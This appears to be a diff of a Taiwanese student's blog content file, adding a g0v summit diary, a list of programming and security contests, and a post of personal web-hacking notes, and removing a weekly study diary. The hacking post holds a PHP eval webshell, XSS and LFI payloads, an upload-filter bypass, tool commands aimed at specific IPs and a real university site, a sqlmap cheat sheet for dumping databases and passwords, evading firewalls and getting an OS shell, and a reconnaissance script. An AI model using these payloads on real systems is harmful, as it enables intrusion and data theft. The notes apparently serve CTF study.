+<h2 id="Day-0-場佈"><a href="#Day-0-場佈" class="headerlink" title="Day 0(場佈)"></a>Day 0(場佈)</h2><ul>
+<li>搬椅子</li>
+<li>搬桌子</li>
+<li>動線規劃</li>
+<li>吃便當</li>
+<li>晚上去饒河夜市</li>
+</ul>
+<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><ul>
+<li>早餐三明治+紅茶</li>
+<li>坐在電梯前好幾個小時</li>
+<li>R0搬椅子</li>
+<li>閒逛</li>
+<li>吃漢堡 吃撈麵</li>
+<li>聽南韓講者超酷</li>
+<li>有夠累</li>
+<li>睡在VIP room</li>
+<li>房間看西甲</li>
+<li>還以為有夜唱</li>
+</ul>
+<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><ul>
+<li>繼續吃</li>
+<li>聽台灣爬蟲開源資料講者 超幽默</li>
+<li>仙草茶</li>
+<li>有個阿北專門來吃東西的</li>
+<li>收桌子</li>
+<li>拆東西</li>
+<li>在閉幕簡報上看到自己 很感動</li>
+<li>慶功宴 佛跳牆 龍蝦 雞佛 啤酒好欸</li>
+<li>才知道現場很多都是資工大佬 頂大好電</li>
+<li>大家都很好聊 一堆E人</li>
+<li>CPY有問題找他就對了 兆翌超好聊 喬不會喝酒笑死 柚子講者超電 賴彥江超幽默 </li>
+<li>口譯大哥說他18歲 pm5光頭超好認 攝影大哥敬酒*n次 室友雨辰居然是文組的</li>
+<li>有人喝醉超好笑 啤酒而已欸</li>
+<li>搭高鐵 好不捨</li>
+<li>整個g0v氣氛好好 好喜歡 2026再來!</li>
+</ul>
+<h1 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h1><p>我愛g0v summit，氣氛好讚，工人福利給過，認識好多新朋友，g0v summit 2026見!</p>
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=huxpnnqf&nd=6&style=11" border="0" alt="網頁計數器"></a></p>
+<!-- End of CuterCounter Code -->
+]]></content>
+      <categories>
+        <category>紀錄</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>電資類競賽分享</title>
+    <url>/sources-share/</url>
+    <content><![CDATA[<h2 id="主要競賽-具指標性"><a href="#主要競賽-具指標性" class="headerlink" title="主要競賽(具指標性):"></a>主要競賽(具指標性):</h2><p>競程類</p>
+<ul>
+<li><a href="https://apcs.csie.ntnu.edu.tw/" style="color: #0066CC;">⭐APCS</a></li>
+<li><a href="https://tpmso.org/toi/" style="color: #0066CC;">⭐TOI</a></li>
+<li><a href="https://contest.cc.ntu.edu.tw/npsc2023/index.html" style="color: #0066CC;">NPSC</a></li>
+<li><a href="https://cpe.cse.nsysu.edu.tw/" style="color: #0066CC;">⭐CPE</a></li>
+<li><a href="https://www.tw-ytp.org/" style="color: #0066CC;">YTP</a></li>
+<li>⭐資訊學科能力競賽<ul>
+<li>校內初賽前2名可參加複賽</li>
+<li>複賽前幾名可參加全國賽(決賽)</li>
+</ul>
+</li>
+<li><a href="https://e-tutor.itsa.org.tw/e-Tutor/" style="color: #0066CC;">ITSA</a></li>
+<li><a href="https://issc.csroc.org.tw/" style="color: #0066CC;">ISSC</a></li>
+<li><a href="https://www.hpcodewars.com.tw/" style="color: #0066CC;">HP CodeWars</a></li>
+<li><a href="https://hspc.csie.ncku.edu.tw/" style="color: #0066CC;">HSPC(成大暑期程式邀請賽)</a></li>
+</ul>
+<p>資安類</p>
+<ul>
+<li><a href="https://csc.nics.nat.gov.tw/" style="color: #0066CC;">⭐金盾獎</a></li>
+<li><a href="https://tcat2023.twisc.ncku.edu.tw/" style="color: #0066CC;">T貓盃</a></li>
+<li><a href="https://ais3.org/eof/" style="color: #0066CC;">⭐AIS3 EOF</a></li>
+<li><a href="https://gics.tw/" style="color: #0066CC;">尋找資安女婕思</a></li>
+<li><a href="https://ais3.org/mfctf/" style="color: #0066CC;">MyFirstCTF</a></li>
+<li><a href="https://ais3.org/" style="color: #0066CC;">⭐AIS3</a></li>
+</ul>
+<p>AI類</p>
+<ul>
+<li><a href="https://www.aicup.tw/" style="color: #0066CC;">AI CUP</a></li>
+</ul>
+<hr>
+<p>年會</p>
+<ul>
+<li><p><a href="https://sitcon.org/2024/" style="color: #0066CC;">SITCON 學生計算機年會</a></p>
+</li>
+<li><p><a href="https://hitcon.org/2024/CMT/" style="color: #0066CC;">HITCON 台灣駭客年會</a></p>
+</li>
+<li><p><a href="https://coscup.org/2024/zh-TW/landing" style="color: #0066CC;">COSCUP 開源人年會</a></p>
+</li>
+<li><p><a href="https://summit.g0v.tw/2024/" style="color: #0066CC;">g0v summit 零時政府雙年會</a></p>
+</li>
+<li><p><a href="https://summit.g0v.tw/2024/" style="color: #0066CC;">g0v summit 零時政府雙年會</a></p>
+</li>
+</ul>
+<p>社群</p>
+<ul>
+<li><a href="https://discord.gg/3fah53Bj46" style="color: #0066CC;">SCINT 北台灣學生資訊社群(北電)</a></li>
+<li><a href="https://discord.gg/R7uguV73tC" style="color: #0066CC;">SCAICT 中電會(中電)</a></li>
+<li><a href="https://discord.gg/g6qfD4Wk9j" style="color: #0066CC;">SCIST (南電)</a></li>
+</ul>
+<hr>
+<h2 id="其他資料"><a href="#其他資料" class="headerlink" title="其他資料:"></a>其他資料:</h2><ul>
+<li><a href="https://hackmd.io/@cube/rJ3o-G1mF" style="color: #0066CC;">程式設計競賽網路資源</a></li>
+<li><a href="https://github.com/goodjack/awesome-cs-training" style="color: #0066CC;">資訊培訓相關資源彙整</a></li>
+<li><a href="https://hackmd.io/@nehs-iced-7th/Skut4WffY" style="color: #0066CC;">實中資研整理</a></li>
+<li><a href="https://hackmd.io/@yuan-tw/SJHj8Xano" style="color: #0066CC;">電資資源整理(不定期更新)</a></li>
+<li><a href="https://github.com/Ice1187/TW-Security-and-CTF-Resource" style="color: #0066CC;">台灣資安 &#x2F; CTF 學習資源整理</a></li>
+</ul>
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hrvxocncc&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
+<!-- End of CuterCounter Code -->]]></content>
+      <categories>
+        <category>資源分享</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>測試用</title>
+    <url>/ss/</url>
+    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>隱藏的檔案</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/git (網頁上看到 Forbidden(403) 通常都是 有這個資料夾)</span><br><span class="line">/.git/index</span><br><span class="line"></span><br><span class="line">git clone https://github.com/BugScanTeam/GitHack.git</span><br><span class="line">執行githack.py</span><br><span class="line"></span><br><span class="line">ex: python2 GitHack.py https://140.134.25.138:10005/.git/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.DS_Store</span><br><span class="line"></span><br><span class="line">git clone https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line"></span><br><span class="line">ex: python2 ds_store_exp.py 140.134.25.138:10006/.DS_Store</span><br></pre></td></tr></table></figure>
+<p>暴力目錄遍歷</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb 網址</span><br></pre></td></tr></table></figure>
+<p>port掃描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -p- -v -T4 (IP)</span><br></pre></td></tr></table></figure>
+<p>網站弱點掃描(kali內建)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -h 網址 -o 輸出檔案(不選擇輸出在終端機上)</span><br><span class="line"></span><br><span class="line">ex: nikto -h https://innopac.lib.fcu.edu.tw/ -o result.html</span><br></pre></td></tr></table></figure>
+
+
+<p>查找封包原始內容 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查Way Back Machine，輸入ip+port</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>會把整個頁面的head全刪除，留下一句Hacked就跑了<br>(勿試)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.getElementsByTagName(&#x27;body&#x27;)[0].innerHTML=&quot;Hacked&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>Dom XSS(?<br>圖片語法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;才不存在呢&quot; onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>實戰偷cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p>實作偷別人的cookie教學<br>(勿試)<br><code>https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1</code></p>
+<hr>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page=c:/Windows/System32/drivers/etc/hosts</span><br><span class="line">page=/etc/passwd</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>php木馬</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_GET[CMD]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">(要執行的時候就hack.php?CMD=phpinfo())</span><br></pre></td></tr></table></figure>
+
+<p>上傳檔案如果有鎖副檔名，用burpsuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">轉</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<h2 id="b374k，後門phpXST"><a href="#b374k，後門phpXST" class="headerlink" title="b374k，後門phpXST"></a>b374k，後門php<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">檔案存在kali桌面了</span><br></pre></td></tr></table></figure><br>XST<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></h2><p>SQL injection</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 注入点 检测注入点是否可用</span><br><span class="line">sqlmap -u 注入点 –batch 自动输入</span><br><span class="line">暴库</span><br><span class="line">sqlmap -u 注入点 –dbs //暴库</span><br><span class="line">Web当前使用的数据库</span><br><span class="line">sqlmap -u 注入点 –current-db //爆当前使用的库</span><br><span class="line">Web数据库使用的账户</span><br><span class="line">sqlmap -u 注入点 –current-user //当前使用的账户</span><br><span class="line">列出sqlserver所有用户</span><br><span class="line">sqlmap -u 注入点 –users // 列出所有使用过的账户</span><br><span class="line">数据库账户与密码</span><br><span class="line">sqlmap -u 注入点 –passwords //mysql的登录账户和密码</span><br><span class="line">列出数据库中的表</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 –tables //(-D指定数据库名称)</span><br><span class="line">列出表中字段</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定的表名 –columns</span><br><span class="line">爆字段内容</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定表名 -C “email,username,userpassword” –dump (将结果导出)</span><br><span class="line">指定导出特定范围字段内容</span><br><span class="line">sqlmap -u注入点-D tourdata -T userb -C “email,username,userpassword”–start 1 –stop 10 –dump (1,10行数)</span><br><span class="line">Cookie注入</span><br><span class="line">sqlmap -u “注入点” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –table –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –dump -C “username,password”–columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">可对以上参数进行结合使用</span><br><span class="line">python sqlmap.py -u “注入点” -f –banner –dbs –users</span><br><span class="line"></span><br><span class="line">post登陆注入 mssql</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http:” –data “tfUName=12345&amp;tfUPass=12345” –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –tables -D “数据库名” ==列表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –columns -T “表名” -D “数据库名” ==暴字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –dump –columns -C “字段,字段” -T “表” -D “数据名” ==暴字段内容</span><br><span class="line"></span><br><span class="line">伪静态注入</span><br><span class="line">注入点：http://.html （注意：要加个* 哪里存在注入就加上 * 号）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –tables -D “数据名” ==获取数据库当中的表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –columns -D “数据名” -T “表名” ==获取数据库的表中的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dump -D “数据名” -T “表名” -C “字段,字段” ==获取数据库的表中的字段内容</span><br><span class="line"></span><br><span class="line">绕过防火墙注入</span><br><span class="line">确认是否开了WAF</span><br><span class="line">Sqlmap -u “注入点” –thread 10 –identify-waf (首选)</span><br><span class="line">sqlmap -u “注入点” –thread 10 –check-waf 备选</span><br><span class="line">使用参数绕过</span><br><span class="line">Sqlmap -u “注入点” –random-agent -v 2 （浏览器绕过）</span><br><span class="line">Sqlmap -u “注入点” –hpp -v 3 (参数污染绕过)</span><br><span class="line">Sqlmap -u “注入点” –delay=3.5 –time-sec=60</span><br><span class="line">Sqlmap -u “注入点” –proxy=211.211.211.211.8080 –proxy-cred=211.:985 代理注入</span><br><span class="line">sqlmap -u “注入点” –ignore-proxy 禁止用代理注入，直接注入</span><br><span class="line">sqlmap -u “注入点” –flush-session 清空会话，重构注入</span><br><span class="line">sqlmap -u “注入点” -hex 或者–no-cast 进行字符码转换</span><br><span class="line">sqlmap -u “注入点” –mobile 对移动端的服务器进行注入</span><br><span class="line">sqlmap -u “注入点” –tor 匿名注入</span><br><span class="line"></span><br><span class="line">直接拿shell或者执行命令（需要权限很大跟物理路径）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-shell</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-cmd=ipconfig</span><br><span class="line"></span><br><span class="line">请求延时（一般突破防火墙）</span><br><span class="line"></span><br><span class="line">第一种方法：sqlmap.py -u url –delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）</span><br><span class="line">第二种方法： sqlmap.py -u url –safe-freq 3 （注意：3是3次的意思。。）</span><br><span class="line"></span><br><span class="line">可以组合使用 sqlmap.py -u url –delay 2 –safe-freq 3</span><br><span class="line"></span><br><span class="line">测试注入点权限：</span><br><span class="line">sqlmap -u url –privileges</span><br><span class="line"></span><br><span class="line">执行shell命令命令</span><br><span class="line">sqlmap -u url –os-cmd=”net user” //执行netuser命令</span><br><span class="line">sqlmap -u url –os-shell //系统交互的shell</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
+<p><a href="https://hackmd.io/@bttea/sqlmap_common_parameters">https://hackmd.io/@bttea/sqlmap_common_parameters</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ $# -ne 1 ];then</span><br><span class="line">    echo &quot;Usage: $0 &lt;target&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">target=$1</span><br><span class="line">mkdir -p recon-$target</span><br><span class="line">cd recon-$target</span><br><span class="line">echo &quot;[*] 正在初始化偵查目標: $target&quot;</span><br><span class="line"></span><br><span class="line"># 1. Whois / DNS 基本資料搜集</span><br><span class="line">echo &quot;[*] Whois資訊搜集...&quot;</span><br><span class="line">whois $target &gt; whois.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] DNS資訊搜集...&quot;</span><br><span class="line">dig $target any &gt; dig_any.txt</span><br><span class="line">dig $target mx &gt; dig_mx.txt</span><br><span class="line">dig $target txt &gt; dig_txt.txt</span><br><span class="line">host -a $target &gt; host.txt</span><br><span class="line">nslookup $target &gt; nslookup.txt</span><br><span class="line"></span><br><span class="line"># 2. 子域名搜集（Kali內建）</span><br><span class="line">echo &quot;[*] 子域名收集(dnsenum+fierce+dnsrecon)...&quot;</span><br><span class="line">dnsenum $target -o dnsenum.xml</span><br><span class="line">fierce --domain $target &gt; fierce.txt</span><br><span class="line">dnsrecon -d $target -a &gt; dnsrecon.txt</span><br><span class="line"></span><br><span class="line"># 3. theHarvester 整合收集Email/帳號/子域</span><br><span class="line">echo &quot;[*] theHarvester收集Email/帳號...&quot;</span><br><span class="line">theHarvester -d $target -b all -f theharvester.html</span><br><span class="line"></span><br><span class="line"># 4. 技術棧分析 (whatweb+curl頭部)</span><br><span class="line">echo &quot;[*] 技術棧分析...&quot;</span><br><span class="line">whatweb -v $target &gt; whatweb.txt</span><br><span class="line">curl -I http://$target &gt; curl_headers.txt</span><br><span class="line"></span><br><span class="line"># 5. Nmap大範圍掃描</span><br><span class="line">echo &quot;[*] Nmap完整掃描...&quot;</span><br><span class="line">nmap -sS -sV -p- -v -T4 $target -oA nmap_fullscan</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Nmap HTTP相關漏洞掃描...&quot;</span><br><span class="line">timeout 60 nmap --script=http-enum,http-vuln* -p 80,443 $target -oA nmap_http_enum</span><br><span class="line"></span><br><span class="line"># 6. HTTP Method測試</span><br><span class="line">echo &quot;[*] HTTP Method探測...&quot;</span><br><span class="line">curl -X OPTIONS -I http://$target &gt; http_methods.txt</span><br><span class="line"></span><br><span class="line"># 7. 爆破目錄與檔案 (gobuster/dirb/wfuzz)</span><br><span class="line">echo &quot;[*] gobuster目錄爆破...&quot;</span><br><span class="line">gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,jsp,php,html,txt,zip,bak,tar.gz -t 50 &gt; gobuster.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] dirb目錄爆破...&quot;</span><br><span class="line">dirb http://$target /usr/share/wordlists/dirb/common.txt &gt; dirb.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] wfuzz爆破...&quot;</span><br><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$target/FUZZ &gt; wfuzz.txt</span><br><span class="line"></span><br><span class="line"># 8. Google Hacking提示</span><br><span class="line">echo &quot;[*] Google Hacking建議語法，請手動搜尋:&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line">echo &quot;site:$target ext:sql | ext:bak | ext:old | ext:backup&quot;</span><br><span class="line">echo &quot;site:$target intitle:\&quot;index of\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;admin\&quot; | \&quot;login\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;upload\&quot; | \&quot;submit\&quot;&quot;</span><br><span class="line">echo &quot;site:$target ext:xml | ext:json | ext:conf | ext:env | ext:jsp&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Warning\&quot; | \&quot;Fatal error\&quot; | \&quot;unexpected token\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;phpinfo()\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;DB_PASSWORD\&quot; | \&quot;AWS_SECRET_ACCESS_KEY\&quot;&quot;</span><br><span class="line">echo &quot;cache:$target&quot;</span><br><span class="line">echo &quot;site:$target filetype:pdf | filetype:docx&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Apache Tomcat\&quot; | \&quot;Jenkins\&quot; | \&quot;Confluence\&quot;&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line"></span><br><span class="line"># 9. 歷史資料蒐集</span><br><span class="line">echo &quot;[*] 手動挖掘Archive歷史頁面，嘗試存取Wayback Machine...&quot;</span><br><span class="line">curl &quot;http://web.archive.org/cdx/search/cdx?url=$target/*&amp;output=text&amp;fl=original&quot; &gt; archive_urls.txt</span><br><span class="line"></span><br><span class="line"># 10. SSL掃描</span><br><span class="line">echo &quot;[*] SSL弱點掃描...&quot;</span><br><span class="line">sslscan $target &gt; sslscan.txt</span><br><span class="line"></span><br><span class="line"># 11. 旁站偵測</span><br><span class="line">echo &quot;[*] 旁站偵測(http-vhosts)...&quot;</span><br><span class="line">nmap --script=http-vhosts -p 80 $target -oA vhost_enum</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 偵查完成，所有資料已經收集！&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://otx.alienvault.com/indicator/ip/210.69.167.102">https://otx.alienvault.com/indicator/ip/210.69.167.102</a></p>
+]]></content>
+      <categories>
+        <category>資安</category>
+      </categories>
+  </entry>
+  <entry>
     <title>漏洞紀錄</title>
     <url>/vulnerability/</url>
     <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><table>
@@ -1627,364 +1749,6 @@ ABaB
       </categories>
   </entry>
   <entry>
-    <title>程式週記</title>
-    <url>/weekly-diary/</url>
-    <content><![CDATA[<h1 id="Week-1-3-17-3-23"><a href="#Week-1-3-17-3-23" class="headerlink" title="Week 1 (3&#x2F;17~3&#x2F;23)"></a>Week 1 (3&#x2F;17~3&#x2F;23)</h1><ul>
-<li>APP (week1)<ul>
-<li>Still searching for a reasonable UI&#x2F;UX</li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>Learn Dart syntax <ul>
-<li>so mind-twisting@@</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Web<ul>
-<li>週記ing</li>
-<li>Encryption algorithm <ul>
-<li>html</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-2-3-24-3-30"><a href="#Week-2-3-24-3-30" class="headerlink" title="Week 2(3&#x2F;24~3&#x2F;30)"></a>Week 2(3&#x2F;24~3&#x2F;30)</h1><ul>
-<li><em>School midterm exam</em></li>
-<li>Programming Contest<ul>
-<li>CPE</li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>C++ <ul>
-<li>Proficient in bit operations</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-3-3-31-4-6"><a href="#Week-3-3-31-4-6" class="headerlink" title="Week 3(3&#x2F;31~4&#x2F;6)"></a>Week 3(3&#x2F;31~4&#x2F;6)</h1><ul>
-<li><em>Earthquake</em></li>
-<li>Programming Contest<ul>
-<li>AI CUP</li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>C++ (CSES)</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-4-4-7-4-13"><a href="#Week-4-4-7-4-13" class="headerlink" title="Week 4(4&#x2F;7~4&#x2F;13)"></a>Week 4(4&#x2F;7~4&#x2F;13)</h1><ul>
-<li>Programming Contest<ul>
-<li>AI CUP <ul>
-<li>big problem@@</li>
-</ul>
-</li>
-<li>HSPC 2024<ul>
-<li>rk 54&#x2F;180 30%</li>
-<li>grade 348&#x2F;900</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>C++ (CSES)</li>
-</ul>
-</li>
-<li>Read<ul>
-<li>Murphy’s Law</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-5-4-14-4-20"><a href="#Week-5-4-14-4-20" class="headerlink" title="Week 5(4&#x2F;14~4&#x2F;20)"></a>Week 5(4&#x2F;14~4&#x2F;20)</h1><ul>
-<li>Programming Contest<ul>
-<li>AI CUP</li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>C++ (CSES)</li>
-</ul>
-</li>
-<li>Read</li>
-<li>Study <ul>
-<li>Machine Learning</li>
-<li>Calculus</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-6-4-21-4-27"><a href="#Week-6-4-21-4-27" class="headerlink" title="Week 6(4&#x2F;21~4&#x2F;27)"></a>Week 6(4&#x2F;21~4&#x2F;27)</h1><ul>
-<li><em>School final exam</em></li>
-<li>Programming Contest<ul>
-<li>CPE<ul>
-<li>rk 595&#x2F;2667 22%</li>
-<li>grade 2&#x2F;7</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Read</li>
-<li>Study <ul>
-<li>CH, EN</li>
-<li>Calculus, Complex number</li>
-</ul>
-</li>
-<li>CTF<ul>
-<li>THJCC CTF<ul>
-<li>rk 145&#x2F;328 42%</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-7-4-28-5-4"><a href="#Week-7-4-28-5-4" class="headerlink" title="Week 7(4&#x2F;28~5&#x2F;4)"></a>Week 7(4&#x2F;28~5&#x2F;4)</h1><ul>
-<li><em>g0v Summit 2024 😍😍</em><ul>
-<li>交超多朋友 好愛</li>
-<li><a href="https://chewu-0319.github.io/personal/g0vsummit/" style="color: #0066CC;">心得+內容</a></li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>C++ (CSES)</li>
-</ul>
-</li>
-<li>Programming Contest<ul>
-<li>Codeforces</li>
-</ul>
-</li>
-<li>AITC(~5&#x2F;5)</li>
-<li>YTP 找隊友</li>
-</ul>
-<hr>
-<h1 id="Week-8-5-5-5-11"><a href="#Week-8-5-5-5-11" class="headerlink" title="Week 8(5&#x2F;5~5&#x2F;11)"></a>Week 8(5&#x2F;5~5&#x2F;11)</h1><ul>
-<li>Programming Contest<ul>
-<li>Codeforces</li>
-</ul>
-</li>
-<li>YTP 找到隊友了!</li>
-<li>Prepare CTF<ul>
-<li>AIS3 pre-exam</li>
-</ul>
-</li>
-<li>Social Designer<ul>
-<li>survey</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-9-5-12-5-18"><a href="#Week-9-5-12-5-18" class="headerlink" title="Week 9(5&#x2F;12~5&#x2F;18)"></a>Week 9(5&#x2F;12~5&#x2F;18)</h1><ul>
-<li><em>2024 CYBERSEC臺灣資安大會</em></li>
-<li>Prepare CTF<ul>
-<li>AIS3 pre-exam</li>
-<li>Take information security class</li>
-</ul>
-</li>
-<li>Social Designer<ul>
-<li>Analyze and write plans</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-10-5-19-5-25"><a href="#Week-10-5-19-5-25" class="headerlink" title="Week 10(5&#x2F;19~5&#x2F;25)"></a>Week 10(5&#x2F;19~5&#x2F;25)</h1><ul>
-<li><em>AIS3 pre-exam</em></li>
-<li>Get exposed to <em>cryptocurrencies</em></li>
-<li>Programming Contest<ul>
-<li>CPE</li>
-</ul>
-</li>
-<li>AIS3 pre-exam <ul>
-<li>rk 145&#x2F;328 44%</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-11-5-26-6-1"><a href="#Week-11-5-26-6-1" class="headerlink" title="Week 11(5&#x2F;26~6&#x2F;1)"></a>Week 11(5&#x2F;26~6&#x2F;1)</h1><ul>
-<li><em>畢業晚會</em></li>
-<li>cryptocurrencies API BOT</li>
-<li>Relax</li>
-<li>Programming language<ul>
-<li>C++</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-12-6-2-6-8"><a href="#Week-12-6-2-6-8" class="headerlink" title="Week 12(6&#x2F;2~6&#x2F;8)"></a>Week 12(6&#x2F;2~6&#x2F;8)</h1><ul>
-<li><em>畢業典禮</em>  &#x2F; <em>錄取AI人才培育計畫</em></li>
-<li>Relax</li>
-</ul>
-<hr>
-<h1 id="Week-13-6-9-6-15"><a href="#Week-13-6-9-6-15" class="headerlink" title="Week 13(6&#x2F;9~6&#x2F;15)"></a>Week 13(6&#x2F;9~6&#x2F;15)</h1><ul>
-<li><em>機車(白沙灣)</em> &#x2F; <em>讀高中生論文</em></li>
-<li>Prepare APCS </li>
-<li>APP (week2)<ul>
-<li>Still searching for a reasonable UI&#x2F;UX</li>
-</ul>
-</li>
-<li>Programming language<ul>
-<li>C++</li>
-</ul>
-</li>
-<li>Relax</li>
-</ul>
-<hr>
-<h1 id="Week-14-6-16-6-22"><a href="#Week-14-6-16-6-22" class="headerlink" title="Week 14(6&#x2F;16~6&#x2F;22)"></a>Week 14(6&#x2F;16~6&#x2F;22)</h1><ul>
-<li><em>APCS</em> &#x2F; <em>新竹煙波飯店</em></li>
-<li>APP (week3)<ul>
-<li>UI&#x2F;UX</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h1 id="Week-15-6-23-6-29"><a href="#Week-15-6-23-6-29" class="headerlink" title="Week 15(6&#x2F;23~6&#x2F;29)"></a>Week 15(6&#x2F;23~6&#x2F;29)</h1><ul>
-<li><em>AI培訓-第一次面談</em> &#x2F; <em>市政府領獎</em> </li>
-<li>APCS 4&#x2F;3 😍</li>
-</ul>
-<hr>
-<h1 id="Week-16-6-30-7-6"><a href="#Week-16-6-30-7-6" class="headerlink" title="Week 16(6&#x2F;30~7&#x2F;6)"></a>Week 16(6&#x2F;30~7&#x2F;6)</h1><ul>
